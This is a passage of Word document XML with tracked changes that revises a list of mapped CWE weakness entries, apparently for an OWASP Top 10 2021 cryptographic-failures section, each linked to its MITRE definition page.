    <w:p w14:paraId="6B65DF23" w14:textId="289713F8" w:rsidR="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="982" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="983" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="984" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## List of Mapped CWEs </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3E2E2286" w14:textId="77777777" w:rsidR="003A277D" w:rsidRPr="00841D1E" w:rsidRDefault="003A277D" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="985" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AEF3C3C" w14:textId="7AEEC176" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="986" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-</w:t>
      </w:r>
      <w:del w:id="987" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>220: Exposure of sens. information through data queries</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="988" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">261: Weak Encoding for </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Password</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/</w:t>
      </w:r>
      <w:del w:id="989" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>220</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="990" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>261</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.html)</w:t>
      </w:r>
      <w:ins w:id="991" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="16E67D33" w14:textId="3480CE05" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="992" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="993" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="994" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-296: Improper Following of a Certificate's Chain of </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Trust](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/296.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="235DD83C" w14:textId="4C6C5CEC" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="995" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-310: Cryptographic </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Issues](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/310.html</w:t>
      </w:r>
      <w:del w:id="996" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>); [CWE-311: Missing Encryption](https://cwe.mitre.org/data/definitions/311.html)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="997" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7435B208" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="998" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="999" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="623D2CF1" w14:textId="4AFBD71D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1000" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1001" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-319: Cleartext Transmission of Sensitive </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Information](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/319.html)</w:t>
      </w:r>
      <w:ins w:id="1002" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5FF20DC3" w14:textId="3A785744" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1003" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1004" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-326: Weak</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1005" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-321: Use of Hard-coded Cryptographic </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Key](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/321.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6406E77A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1006" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1007" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-322: Key Exchange without Entity </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Authentication](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/322.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="77EB13E6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1008" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1009" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-323: Reusing a Nonce, Key Pair in</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Encryption](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/</w:t>
      </w:r>
      <w:ins w:id="1010" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">323.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="106763EE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1011" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1012" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-324: Use of a Key Past its Expiration </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Date](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/324.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="69716139" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1013" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1014" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-325: Missing Required Cryptographic </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Step](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/325.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3DABB7A6" w14:textId="35B89C7A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1015" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1016" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-326: Inadequate Encryption </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Strength](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>https://cwe.mitre.org/data/definitions/</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>326.html</w:t>
      </w:r>
      <w:del w:id="1017" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>);</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1018" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7FB14360" w14:textId="7073193D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1019" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-327: </w:t>
      </w:r>
      <w:ins w:id="1020" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Use of a </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Broken</w:t>
      </w:r>
      <w:del w:id="1021" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1022" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> or </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Risky </w:t>
      </w:r>
      <w:del w:id="1023" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Crypto</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1024" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Cryptographic </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Algorithm</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/327.html)</w:t>
      </w:r>
      <w:ins w:id="1025" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4E72C58A" w14:textId="4A068AE1" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1026" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1027" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
